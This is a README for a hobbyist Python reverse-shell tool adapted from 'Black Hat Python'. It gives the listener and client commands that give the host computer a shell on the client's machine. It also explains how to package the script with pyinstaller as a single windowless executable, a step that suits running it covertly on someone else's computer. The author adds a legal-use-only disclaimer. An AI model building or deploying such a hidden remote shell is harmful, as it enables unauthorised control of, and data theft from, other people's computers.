==============PYTHON NETWORKING TOOL==============

Created by: Leonard Haddad

Inspired by the network tool from the Book "Black
Hat Python - Python Programming for Hackers and
Pentesters" by Justin Seitz 

=======================SETUP======================

Python Version 3.7 (Other versions might not work!)

Both the tool.py and tool.pyw run the same commands,
however the pyw will run without an open window and 
therefor cannot be converted to an executeable.
This happens because the server needs to send data
to the client, which it cannot achieve if the window
is running in the background, hence the socket will
get disconnected!

To convert the python file to an executeable, install
pyinstaller by calling the following from terminal:
( also works in cmd on Windows if pip is installed )

pip install pyinstaller

and then convert the file into an executeable:

pyinstaller -w --onefile tool.py  

(*) PYW VERSION WILL NOT WORK! REASON STATED ABOVE!

=======================USAGE======================

For the host computer:

tool.py -l -p port

This will setup a listener on [IP_Address]:[Port]

(*) For the host the IP is set to the default IP Address
(*) You can look up your IP Address with whatsmyip.org

And for the client computer:

tool.py -t Host_IP_Address -p Port

Where the target is the Host's ip address and the port 
the above port

Using these commands will give the host computer a shell
on the client's computer. More features such as file upload
will be added later.

=====================DISCLAIMER===================

As stated above this tool is inspired by the networking
tool from Justin Seitz's book "Black Hat Python - Python
for Hackers and Pentesters", therefor the code might look
quite familiar to the code in the book.

Furthermore the code is inspired by the python reverse
shell script from one fellow youtuber whose name I forgot.

THIS TOOL IS MEANT TO BE USED IN LEGAL WAYS ONLY. MISUSE
OR ABUSE OF THIS TOOL OR IT'S SCRIPT MIGHT RESULT IN LEGAL
CONSEQUENCES WHICH I WILL NOT BE HELD ACCOUNTABLE FOR.
YOU HAVE BEEN WARNED!

===================================================
